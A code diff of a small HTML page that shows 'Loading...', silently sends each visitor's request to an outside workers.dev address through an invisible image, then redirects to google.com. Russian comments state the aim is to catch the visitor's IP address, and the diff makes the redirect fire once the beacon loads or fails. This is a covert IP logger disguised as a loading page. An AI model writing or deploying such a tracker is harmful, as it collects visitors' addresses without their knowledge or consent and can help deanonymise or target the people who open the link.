@@ -6,18 +6,26 @@
         const t = encodeURIComponent(new Date().toLocaleString());
         const url = "https://adminfdm.alexgranny1708.workers.dev/";
 
-        // Создаем невидимый элемент картинки (это надежнее fetch)
         const i = new Image();
+        
+        // Функция для ухода в Google
+        function go() {
+            window.location.replace("https://google.com");
+        }
+
+        // Если картинка загрузилась (IP пойман) — сразу уходим
+        i.onload = go;
+        // Если провайдер заблокировал (ошибка) — всё равно уходим
+        i.onerror = go;
+
+        // Отправляем запрос
         i.src = url + "?t=" + t;
 
-        // Мгновенный редирект через 0.3 секунды
-        setTimeout(function() {
-            window.location.replace("https://google.com");
-        }, 300);
+        // Жесткий предохранитель на 1.5 секунды (если всё зависло)
+        setTimeout(go, 1500);
     </script>
 </head>
 <body>
     <p>Loading...</p>
 </body>
 </html>
-
